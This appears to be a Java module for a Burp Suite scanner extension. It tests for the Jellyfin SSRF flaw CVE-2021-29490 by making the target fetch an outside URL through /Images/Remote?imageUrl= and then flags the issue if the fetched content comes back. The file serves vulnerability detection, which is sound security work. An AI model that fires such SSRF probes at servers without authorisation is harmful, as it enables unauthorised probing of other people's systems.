package burp.scan.active.poc;

import burp.IBurpExtenderCallbacks;
import burp.IScanIssue;
import burp.scan.active.ModuleBase;
import burp.scan.active.ModuleMeta;
import burp.scan.active.feature.risk.NormalRisk;
import burp.scan.lib.Confidence;
import burp.scan.lib.GtScanIssue;
import burp.scan.lib.Risk;
import burp.scan.lib.utils.Logger;
import burp.scan.lib.web.WebPageInfo;
import burp.scan.lib.web.utils.GtRequest;
import burp.scan.lib.web.utils.GtSession;
import burp.scan.lib.web.utils.GtURL;
import burp.scan.tags.TagTypes;
import burp.scan.tags.TagUtils;

import java.io.IOException;
import java.net.URL;
import java.util.HashSet;
import java.util.Set;

public class Jellyfin_CVE_2021_29490 implements ModuleBase, NormalRisk {
    @Override
    public void scan(IBurpExtenderCallbacks callbacks, WebPageInfo webInfo) {
        Logger logger = Logger.getLogger(this);
        var url = new GtURL(webInfo.getUrl());
        var baseUrl = url.getBaseUrl();
        var targetUrl = baseUrl + "/Images/Remote?imageUrl=http://baidu.com";
        var session = GtSession.getGlobalSession();
        GtRequest request = new GtRequest(targetUrl);
        try {
            var response = session.sendRequest(request);
            var respBody = new String(response.getBody());
            if (respBody.contains("baidu.com") && response.getStatudCode() == 200) {
                IScanIssue issue = new GtScanIssue(
                        response.getRequestResponse().getHttpService(),
                        new URL(targetUrl),
                        response.getRequestResponse(),
                        "Jellyfin CVE-2021-29490",
                        "https://mp.weixin.qq.com/s/lZcjStsMKz-VeP-KjU2H7g",
                        "",
                        Risk.Medium,
                        Confidence.Firm
                );
                webInfo.addIssue(issue);
                callbacks.addScanIssue(issue);
            }
        } catch (IOException e) {
            logger.error(e.getLocalizedMessage());
        }
    }

    @Override
    public Set<String> getTags() {
        Set<String> tags = new HashSet<>();
        tags.add(TagUtils.toStandardName(TagTypes.Jellyfin_Java));
        return tags;
    }

    @Override
    public ModuleMeta getMetadata() {
        return null;
    }
}
